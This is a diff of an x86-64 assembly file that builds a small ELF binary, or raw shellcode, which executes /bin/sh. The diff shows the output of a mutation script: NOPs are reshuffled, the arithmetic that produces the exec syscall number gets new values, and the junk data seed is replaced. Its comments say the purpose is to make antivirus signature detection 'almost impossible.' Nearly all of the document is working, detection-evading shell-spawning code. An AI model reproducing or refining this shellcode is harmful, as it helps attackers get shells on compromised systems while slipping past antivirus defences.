@@ -1,9 +1,9 @@
+; This is example only. Do not use. Generate new!!
 ;
 ;      ooo           ***           ...           ...           ...
 ;     (o o)         (o o)         (- -)         (. .)         (* *)
 ; ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-
 ;
-; Fully Undetectable exec /bin/sh program. No AV trigger.
 ; Generated from a script by CH405.
 ; Thx to 0x00000000 for idea. ^^
 ; Create smallest binary or cut and paste for shellcode use.
@@ -12,8 +12,6 @@
 ; Do not forget to chmod +x shellexec
 ;
 ; Have happy fun! Do not be bad man. Do not be illegal man
-;
-; Generate 2024-10-10 22:37:58
 
 bits 64
             org 0x08048000
@@ -52,19 +50,19 @@ phdrsize    equ     $ - phdr
 
 _start:
     mov rax, 0x68732f6e69622f 	; mov  value "/bin/sh" in hex to rax
-    nop				; No operation, Actually do nothing.
-    nop				; No operation, Actually do nothing.
-    nop				; No operation, Actually do nothing.
     push rax
     push rsp
     pop rdi
     xor eax, eax		; Random way to make eax equal 0
     push rax
-    mov al, 83			; Mutate function, start with random value
-    sub al, 50			; sub random value
-    add al, 26			; make sure al has value 59 for exec syscall
+    nop				; No operation, Actually do nothing.
+    nop				; No operation, Actually do nothing.
+    mov al, 163			; Mutate function, start with random value
+    sub al, 121			; sub random value
+    add al, 17			; make sure al has value 59 for exec syscall
     push rsp
     pop rdx
+    nop				; No operation, Actually do nothing.
     push rsp
     pop rsi
     syscall 			; calling function 59, exec
@@ -73,4 +71,4 @@ filesize      equ     $ - $$
 ; Insert generate junk. Can be removed but only add 8-10 bytes.
 ; Make signature identification almost impossible.
 section .data
-seed db ":PP:b><Z"
+seed db "Ul9e)=s;"
